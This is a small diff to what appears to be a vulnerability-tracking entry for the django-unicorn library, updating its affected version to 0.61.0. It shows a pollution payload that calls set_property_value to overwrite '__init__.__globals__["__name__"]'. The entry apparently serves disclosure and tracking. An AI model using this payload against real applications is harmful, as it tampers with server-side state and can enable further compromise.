@@ -4,7 +4,7 @@
 
 + Library: django-unicorn
 + Stars: 2.4K
-+ Version: N/A
++ Version: 0.61.0
 + CVE: N/A
 + Status: Pending
 + Payload: ```django_unicorn.views.action_parsers.utils.set_property_value(unicornViewObj, '__init__.__globals__["__name__"]', 'polluted')```
